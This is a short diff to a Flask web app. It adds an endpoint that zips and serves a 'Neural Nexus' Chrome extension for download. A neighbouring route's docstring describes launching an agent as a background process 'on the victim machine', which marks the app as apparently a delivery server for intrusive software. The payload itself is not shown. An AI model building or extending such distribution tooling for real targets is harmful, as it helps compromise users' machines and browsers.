@@ -308,6 +308,28 @@ def marketplace():
     return send_from_directory(app.static_folder, "marketplace.html")
 
 
+@app.route("/skill/extension", methods=["GET"])
+def skill_extension():
+    """Serves the Neural Nexus Chrome extension as a zip archive."""
+    import zipfile, io
+    ext_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "extension")
+    if not os.path.isdir(ext_dir):
+        return jsonify({"error": "extension not found"}), 404
+    buf = io.BytesIO()
+    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
+        for fname in sorted(os.listdir(ext_dir)):
+            fpath = os.path.join(ext_dir, fname)
+            if os.path.isfile(fpath):
+                zf.write(fpath, fname)
+    buf.seek(0)
+    return send_file(
+        buf,
+        mimetype="application/zip",
+        as_attachment=True,
+        download_name="neural_nexus_extension.zip",
+    )
+
+
 @app.route("/skill/execute", methods=["POST"])
 def skill_execute():
     """Launches the Neural Nexus skill agent as a background process on the victim machine."""
